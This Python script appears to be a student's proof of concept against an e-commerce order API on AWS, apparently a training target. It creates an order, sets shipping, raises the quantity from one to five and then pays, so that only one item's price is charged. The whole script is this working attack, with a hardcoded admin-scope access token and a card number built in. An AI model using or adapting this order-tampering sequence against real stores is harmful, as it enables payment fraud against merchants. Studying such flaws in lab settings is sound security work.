import requests
import random
import string
# This script shows the race condidtion (Attack not shown in doc)
headers = {
    'Accept': 'application/json',
    'Authorization': 'eyJraWQiOiJHYjNJQzQ3U2FjRTBCelNSTEM1c1JVWXF0eW9USGdwWkRrdFwvYzdXVW4wcz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiLCJldmVudF9pZCI6ImRlYmJlZjEyLWUyNzAtNDZhMC05M2NjLWE4YmIxMTVkMzljNSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE1ODkyMzcxNDIsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX01ZYTZuSUFqRiIsImV4cCI6MTU4OTI0MDc0MiwiaWF0IjoxNTg5MjM3MTQyLCJqdGkiOiI1NzFjNDQ1YS00MmEwLTQ2ZGQtYjQ4Yy04MDgxNzNkNTI1MzkiLCJjbGllbnRfaWQiOiIzYWJoOW4yOTV0aTBycWlrM2k1M2o0aW1vcSIsInVzZXJuYW1lIjoiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIn0.XWKsgKUVJwnq0-halwOjm1kKAljngj24Z_VAnJT02S1YvRLVrKXgxiXr_66TwcwTCr2ZIEagSmZuWwrRYCrcnMlAeboX4ZydaV1TOzf_US1Fc83C3REru2cxoKZtjupJoZa0KGDGLZj6hHc8ZeaSquyCuKe-VCDvTY9a1po03j1-2W9NFGv59GG02pva3DEO1a4Jljq-HK-Gbyk6tfpdxbo4xaRv0JKNYpre7CWdzuBKzScDBS-2n3DmXAUw91JK9FNE7PR2pE_xNOfAg5LfeJP5z48FUitFauB2ViK6D_B8-2pWEQ-YWLqSuOZl0_1dAsGwY5BUsiIf7z-VWZlwAw'
}

def randomCartID(stringLength=20):
    numbers = string.digits
    return ''.join(random.choice(numbers) for i in range(stringLength))


cartID = randomCartID()
response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action":"new","cart-id":""+cartID+"","items":{"19":1}})
print(response.content)
x = response.content
orderID = str(x.decode("utf-8")[49:-2])
print("Getting Order ID..")
response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action":"shipping","order-id":""+orderID+"","data":{"name":"Hacker","address":" Hacker Town","email":"b00105961@mytudublin.ie","phone":"+133333333337"}})
print(response.content)
print("Filling in Address and name")
response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action":"update","order-id":""+orderID+"","items":{"19":5}})
print(response.content)
print("change from 1 item to 5 items")
response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action":"billing","order-id":""+orderID+"","data":{"ccn":"4904661882708314","exp":"02/23","cvv":"123"}})
print(response.content)
print("Pay before the total price has been updated (not the amount was only the price of one)")


#response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action":"orders"})
#print(response.content)
